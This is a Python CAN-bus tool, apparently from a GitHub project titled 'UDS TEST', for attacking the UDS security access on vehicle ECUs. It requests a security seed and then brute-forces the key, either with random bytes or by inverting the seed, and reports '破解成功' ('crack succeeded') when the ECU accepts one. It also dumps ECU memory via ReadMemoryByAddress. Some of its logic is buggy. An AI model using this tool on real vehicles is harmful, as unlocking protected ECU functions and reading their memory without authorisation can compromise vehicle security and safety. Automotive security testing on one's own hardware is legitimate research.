import can
import time
import signal
import sys
import random
import os

def signal_handler(sig, frame):
    print("\nCtrl+C detected. Exiting...")
    sys.exit(0)

def Save_log(seed):
    log_file = "seed.log"  # 日志文件名
    bytes_seed = bytes(seed)
    hex_seed = ' '.join(f'{b:02X}' for b in seed)  # 转换为十六进制并用空格分隔

    # 确定当前的计数
    if os.path.exists(log_file):
        with open(log_file, "rb") as f:
            lines = f.readlines()
            count = len(lines) + 1
    else:
        count = 1 
    # 写入十六进制文件并添加换行符
    with open(log_file + "_hex", "a") as f_hex:
        f_hex.write(hex_seed + '\n')

def send_message(bus, arbitration_id, data, is_extend_id):
    # 创建 CAN 消息对象
    message = can.Message(arbitration_id=arbitration_id,
                          data=data,
                          is_extended_id = is_extend_id)  
    # 发送消息
    bus.send(message)

def send_data(bus, arbitration_id, data_length, data, is_extend_id):
    # 准备要发送的数据

    data = bytes(data)  # 将输入的数据转换为字节串
    # 检查数据长度
    if data_length <= 7:
        # 数据长度小于或等于7字节，可以发送单帧消息

        data = data.ljust(8, b'\x55')
        send_message(bus, arbitration_id, data, is_extend_id)
    else:
        # 数据长度大于7字节，需要分割成多帧消息发送
        num_frames = (data_length) // 7  # 计算总帧数，向上取整
        for i in range(num_frames):
            # 计算当前帧的数据
            frame_data = data[i * 7: (i + 1) * 7]
            # 设置FF标志以指示这是多帧消息的首帧或连续帧
            if i == 0:
                frame_data = bytes([0x10]) + frame_data
            else:
                frame_data = bytes([0x20 + i]) + frame_data
            
             # 如果是最后一帧且不满8个字节，则补齐为8字节
            if i == num_frames - 1 and len(frame_data) < 8:
                frame_data = frame_data.ljust(8, b'\x55')
            # 发送当前帧消息
            send_message(bus, arbitration_id, frame_data, is_extend_id)
            
def switch_NRC(data):
    argument = data[3]
    switcher = {
        11: print("NRC==11,  服务不支持"),
        1: "One",
        35: print("NRC==35,  密钥无效"),
        36: print("NRC==36,  解锁次数超过限制"),
        2: "Two"
    }
    print("Invalid argument:", argument)

def extended_session(bus,arb_id, is_extend_id):
    # 发送进入扩展会话的CAN消息
    enter_extended_session = can.Message(arbitration_id=arb_id, data=[0x02, 0x10, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=is_extend_id)
    bus.send(enter_extended_session)

def process_seed(bus, arb_id, data,expected_response_ids,data_length,is_extend_id,seed_data):
    # 按位取反
    inverted_data = [~b & 0xFF for b in seed_data]
    data_hex = ' '.join(f"{b:02X}" for b in inverted_data)
    print(f"Processed seed data (inverted): {data_hex}\n")
    if data_length <= 7:
        # 构造单帧消息
        new_data = [data_length, data[1], data[2] + 1] + inverted_data
        send_data(bus, arbitration_id=arb_id, data_length=data_length, data=new_data, is_extend_id = is_extend_id)
    else:
        new_data = [data_length, data[1], data[2] + 1] + inverted_data
        send_data(bus, arbitration_id=arb_id, data_length=len(new_data), data=new_data, is_extend_id = is_extend_id)
    
    print("sendkey\n")     
    # 接收种子响应
    response = []
    while True:
        msg = bus.recv()
        if msg is None:
            break 

        if msg.arbitration_id in expected_response_ids and (msg.data[1]==0x67 or msg.data[1]==0x7F or msg.data[2]==0x27):
            response.append(msg)
            response_data = " ".join("{:02X}".format(byte) for byte in response[0].data)
            print("Response data:", response_data)
            break

    if response:
        # 解析响应数据
        response_data = " ".join("{:02X}".format(byte) for byte in response[0].data)
        # 判断响应数据的第一字节前四位是否为0
        if response[0].data[1] == 0x7F:
            print("Request failed. Response data:", response_data)
            #switch_NRC(response[0])
            return
        elif response[0].data[1] == 0x67:
            print("破解成功")
    else:
        print("no Response for key")

def send_key(bus, arb_id, data,expected_response_ids,data_length,is_extend_id):
    # 构造请求种子的CAN消息
    if data_length <= 7:
        # 构造单帧消息
        new_data = [data_length, data[1], data[2] + 1] + [random.randint(0, 255) for _ in range(data_length-2)]
        send_data(bus, arbitration_id=arb_id, data_length=data_length, data=new_data, is_extend_id = is_extend_id)
    else:
        new_data = [data_length, data[1], data[2] + 1] + [random.randint(0, 255) for _ in range(data_length-2)]
        send_data(bus, arbitration_id=arb_id, data_length=len(new_data), data=new_data, is_extend_id = is_extend_id)

    print("sendkey\n")     
    # 接收种子响应
    response = []
    while True:
        msg = bus.recv()
        if msg is None:
            break 

        if msg.arbitration_id in expected_response_ids and (msg.data[1]==0x67 or msg.data[1]==0x7F or msg.data[2]==0x27):
            response.append(msg)
            response_data = " ".join("{:02X}".format(byte) for byte in response[0].data)
            print("Response data:", response_data)
            break

    if response:
        # 解析响应数据
        response_data = " ".join("{:02X}".format(byte) for byte in response[0].data)
        # 判断响应数据的第一字节前四位是否为0
        if response[0].data[1] == 0x7F:
            print("Request failed. Response data:", response_data)
            #switch_NRC(response[0])
            return
        elif response[0].data[1] == 0x67:
            print("破解成功")
    else:
        print("no Response for key")

def request_seed(bus, arb_id,expected_response_ids, level, is_extend_id,choice):
    # 构造请求种子的CAN消息
    request_data=[0x02, 0x27, level]
    # 发送请求种子的CAN消息
    send_data(bus, arb_id, 6, request_data, is_extend_id)

    # 接收种子响应
    response = []
    while True:
        msg = bus.recv()
        if msg is None:
            break 

        if msg.arbitration_id in expected_response_ids and (msg.data[1]==0x67 or msg.data[2]==0x67 or msg.data[2] == 0x27):
            response.append(msg)
            #response_data = " ".join("{:02X}".format(byte) for byte in response[0].data)
            #print("Response data:", response_data)
            break
        
    if response:
        # 解析响应数据
        response_data = " ".join("{:02X}".format(byte) for byte in response[0].data)
        # 检查第二字节+0x40是否等于接收到的第二字节
        expected_next_seq = (request_data[1] + 0x40) & 0xFF
        # 判断响应数据的第一字节前四位是否为0
        if response[0].data[0] >> 4 == 0b0000:
            if response[0].data[1] == 0x7F:
                print("Request failed. Response data:", response_data)
                #switch_NRC(response[0])
                return
            elif response[0].data[1] == expected_next_seq:
                # 计算种子长度
                data_length = (response[0].data[0] & 0x0F) 
                # 从响应消息中提取指定长度的数据字节，每行从第二个字节开始，跳过每行的第一个字节
                seed = [byte for msg in response for byte in msg.data][3:data_length+1]
                print(" ".join(format(decimal, '02X') for decimal in seed))
                Save_log(seed)
                if choice==1:
                    send_key(bus, arb_id, request_data,expected_response_ids,data_length,is_extend_id)
                elif choice == 2:
                    process_seed(bus, arb_id, request_data,expected_response_ids,data_length,is_extend_id,seed)
                else:
                    print("No response received.")     
            else:
                print("Request failed. Response data:", response_data)                
        # 判断响应数据的第一字节前四位是否为1
        elif response[0].data[0] >> 4 == 0b0001:
            # 发送流控制帧
            flow_control_frame = can.Message(arbitration_id=arb_id, data=[0x30, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id = is_extend_id)
            bus.send(flow_control_frame)
            while True:
                msg = bus.recv()
                if msg is None:
                    break
                if msg.arbitration_id in expected_response_ids and msg.data[0] >> 4 == 0b0010:
                    response.append(msg)
                    response_data = " ".join("{:02X}".format(byte) for msg in response for byte in msg.data)
                    #print("Response data:", response_data)
                    total_bytes = sum(len(msg.data) for msg in response)
                    #print("Response data:", total_bytes)
                    #print("data1" , response[0].data[1])
                    if total_bytes > response[0].data[1]:
                        break  
            # 检查第二字节+0x40是否等于接收到的第三字节
            if response[0].data[2] == expected_next_seq:
                # 计算种子长度
                data_length = (response[0].data[0] & 0x0F) << 8 | response[0].data[1]
                # 从响应消息中提取指定长度的数据字节，每行从第二个字节开始，跳过每行的第一个字节
                seed = [byte for msg in response for i, byte in enumerate(msg.data) if i % 8 != 0][3:data_length+1]
                Save_log(seed)
                print(" ".join(format(decimal, '02X') for decimal in seed))

                if choice:
                    send_key(bus, arb_id, request_data,expected_response_ids,data_length,is_extend_id)
                elif choice == 2:
                    process_seed(bus, arb_id, request_data,expected_response_ids,data_length,is_extend_id,seed)
            else:
                print("Request failed. Response data:", response_data)
        else:
            print("返回首帧既不为0也不为1")
    else:
        print("no Response for seed")
def send_flow_control(bus):
    # 发送流控制帧（示例）
    control_msg = can.Message(arbitration_id=0x7E0, data=[0x30, 0x00, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00], is_extended_id=False)
    bus.send(control_msg)

def read_memory(bus, start_address):
    # 发送流控制帧
    send_flow_control(bus)

    # 读取 0xFF 个地址
    msg = can.Message(arbitration_id=0x7E0, data=[
        0x07, 0x23, 0x14,
        (start_address >> 24) & 0xFF,
        (start_address >> 16) & 0xFF,
        (start_address >> 8) & 0xFF,
        start_address & 0xFF,
        0xFF
    ], is_extended_id=False)
    bus.send(msg)

    all_data = []
    
    # 接收多帧响应
    while True:
        response = bus.recv()
        if response:
            data = response.data
            all_data.extend(data)

            # 保存十六进制数据
            with open("hex_data.txt", "a") as hex_file:
                hex_file.write(' '.join(f"{b:02X}" for b in data) + '\n')

            # 检查是否是最后一帧
            if len(data) < 8:  # 假设最后一帧小于 8 字节
                break

    # 转换为 ASCII
    ascii_string = ''.join(chr(b) for b in all_data if 32 <= b <= 126)
    print(f"Address: {hex(start_address)}, ASCII: {ascii_string}")
def print_log_header():
    print("   .               .    ")
    print(" .´  ·  .     .  ·  `.  UDS TEST")
    print(" :  :  :  (¯)  :  :  :  A CAN Test Tool")
    print(" `.  ·  ` /¯\\ ´  ·  .´  by 1in-oos")
    print("   `     /¯¯¯\\     ´   https://github.com/1in-oos/seedtest.git")
    print("="*50)

def get_arbitration_id():
    id_input = input("Enter CAN message ID (hex, leave empty to use default 7E0): ").strip()
    if id_input:
        return int(id_input, 16)
    else:
        return 0x7E0
def UDS_SID():
    SID = input("Enter Service Identifier Data (hex, leave empty to use default 27): ").strip()
    if SID:
        return int(SID, 16)
    else:
        return 0x27
    
def get_27_level():
    level_input = input("Enter 27 Security Access Level bytes (hex, leave empty to use default 01): ").strip()
    if level_input:
        seed_choice = get_seed_choice()
        return int(level_input, 16),seed_choice
    else:
        seed_choice = get_seed_choice()
        return 0x01,seed_choice

def get_seed_choice():
    choice_input = input("请输入0,1,2进行种子爆破(0: 不进行,1: 随机,2: 取反, leave empty to use default 0): ").strip()
    if choice_input:
        return int(choice_input)
    else:
        return 0

def main():
    print_log_header()
    
    arb_id = get_arbitration_id()
    SID = UDS_SID()
    start_address = 0xC3F80000
# 数据处理
    # 检查消息的ID是否是发送ID加8或者是交换ID的后两个字节 
    is_extend_id = arb_id > 0x7FF
    expected_response_ids =  {arb_id + 8, arb_id - 8,(arb_id & 0xFFFF0000) | ((arb_id & 0x0000FF00) >> 8) | ((arb_id & 0x000000FF) << 8)}
    #id过滤
    filters = [
        {"can_id": arb_id+8, "can_mask": 0x7FF, "extended": False},
        {"can_id": arb_id-8, "can_mask": 0x7FF, "extended": False},
        {"can_id": (arb_id & 0xFFFF0000) | ((arb_id & 0x0000FF00) >> 8) | ((arb_id & 0x000000FF) << 8), "can_mask": 0x1FFFFFFF, "extended": True},
        {"can_id": arb_id, "can_mask": 0x1FFFFFFF, "extended": True},
    ]

    bus = can.interface.Bus(channel="vcan0", interface="socketcan", can_filters=filters)
    # 注册信号处理程序
    signal.signal(signal.SIGINT, signal_handler)

# 其他逻辑代码可以在这里继续
    if SID == 0x27:
        level,seed_choice = get_27_level()

        print("\nConfiguration Summary:")
        print(f"Using arbitration ID: {hex(arb_id)}")
        print(f"Security Access Level: {hex(level)}")
        print(f"Seed choice: {seed_choice}")
        
        try:
            # 请求2000次种子
            for i in range(1):
                print("Requesting seed", i + 1)
                extended_session(bus,arb_id, is_extend_id)
                time.sleep(0.02)
                request_seed(bus, arb_id,expected_response_ids, level, is_extend_id,seed_choice)
                time.sleep(0.02)  # 间隔一段时间再发送下一个请求，以避免发送速率过快

        except KeyboardInterrupt:
            bus.shutdown()
            print("\nCtrl+C detected. Exiting...")
        finally:
            # 关闭CAN总线接口
            bus.shutdown()
    elif SID == 0x23:
        try:
            read_memory(bus, start_address)
            start_address += 0xFF  # 每次加 0xFF
            time.sleep(0.1)  # 适当的延迟，避免发送过快

        except KeyboardInterrupt:
            bus.shutdown()
            print("\nCtrl+C detected. Exiting...")
        finally:
            # 关闭CAN总线接口
            bus.shutdown()

if __name__ == "__main__":
    main()


